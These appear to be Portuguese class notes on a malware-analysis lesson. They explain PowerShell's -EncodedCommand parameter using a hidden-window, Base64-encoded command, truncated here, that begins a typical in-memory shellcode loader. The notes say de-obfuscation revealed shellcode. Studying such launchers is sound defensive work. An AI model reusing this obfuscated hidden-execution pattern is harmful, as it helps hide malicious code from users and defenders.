Na aula 15, fizemos uma análise nesse script de powershell para entendermos



'''

powershell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwBiAFgAUABhAE8AQgBEACsASABIADYARgBQAG0AVABHADkAZwBRAG8AQwBXAGsAUwBlAHAATwBaADgAbwA0ADUASQBDAFEAbQBDAFMAMQBsAEcAQwBIAEwAeABHAEEAcwBrAEcAUwBEAGEAZgB2AGYAYgAyAFYAagBTAHEALwBKAFgAVwBmAHUATQBz....... (Tem bem mais caracteres)



'''





* O que é **-EncodedCommand**?
* 
* ***-EncodedCommand*** eh um parametro do executavel powershell.ex que recebe um comando codificado em Base64. Em vez de passar o texto do comando legivel no prompt, voce passa a versao em Base64 — o PowerShell decodifica (esperando UTF-16LE / "Unicode") e executa o que estiver ali.





Basicamente foi apresentando como e feito a execução de códigos ofuscados em powershell e mostrando assim após a desofuscação um "ShellCode".

